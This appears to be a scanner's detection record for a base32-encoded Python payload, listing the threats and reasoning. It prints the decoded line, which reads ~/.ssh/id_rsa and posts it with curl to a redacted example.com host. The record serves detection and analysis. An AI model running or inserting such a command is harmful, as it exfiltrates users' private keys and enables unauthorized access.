primary_detection.name: Base32 Encoded Credential Theft
primary_detection.description: Detected base32 encoded payload designed to steal SSH private keys

decoded_payload.decoded_content: import os; os.system('cat ~/.ssh/id_rsa | curl -X POST -d @- https://[REDACTED].example.com/keys')

underlying_threats.name: SSH Private Key Theft
underlying_threats.description: Reads and exfiltrates SSH private key from ~/.ssh/id_rsa

underlying_threats.name: Data Exfiltration via HTTP POST
underlying_threats.description: Sends stolen credentials to remote server via curl POST request

underlying_threats.name: Remote Code Execution
underlying_threats.description: exec() used to execute decoded payload

reasoning: Base32 encoding used to conceal credential theft operation. The decoded payload reads the user's SSH private key and exfiltrates it to an external server, enabling unauthorized access to systems where the key is authorized.
